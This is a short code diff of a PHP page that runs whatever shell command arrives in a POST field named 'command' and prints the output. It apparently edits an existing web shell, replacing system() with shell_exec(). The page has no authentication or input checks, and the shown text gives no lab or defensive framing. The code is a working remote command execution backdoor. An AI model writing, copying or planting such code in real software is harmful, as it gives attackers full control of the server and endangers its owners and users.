@@ -13,7 +13,8 @@
         <?php
         if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['command']) {
             echo '<pre>';
-            system($_POST['command']);
+            $output = shell_exec($_POST['command']);
+            echo $output;
             echo '</pre>';
         }
         ?>
